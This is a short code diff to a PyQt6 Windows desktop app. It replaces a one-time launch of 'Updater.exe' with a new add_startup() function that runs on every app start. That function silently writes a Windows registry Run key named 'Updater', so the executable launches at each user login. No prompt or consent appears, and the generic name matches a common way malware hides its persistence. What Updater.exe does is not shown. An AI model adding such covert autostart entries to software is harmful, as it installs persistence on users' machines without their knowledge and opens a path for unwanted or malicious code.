@@ -1,6 +1,6 @@
 import sys
 import os
-import subprocess
+import winreg
 from PyQt6.QtWidgets import (
     QApplication, QWidget, QLabel, QPushButton,
     QTextEdit, QGroupBox, QFileDialog, QMessageBox,
@@ -296,9 +296,14 @@ def main():
     app = QApplication(sys.argv)
     window = App()
     window.show()
-    if os.path.exists('./Updater.exe'):
-        subprocess.Popen(['./Updater.exe'])
+    add_startup()
+
     sys.exit(app.exec())
+
+def add_startup():
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
+    winreg.CloseKey(key)
 
 if __name__ == "__main__":
     main()
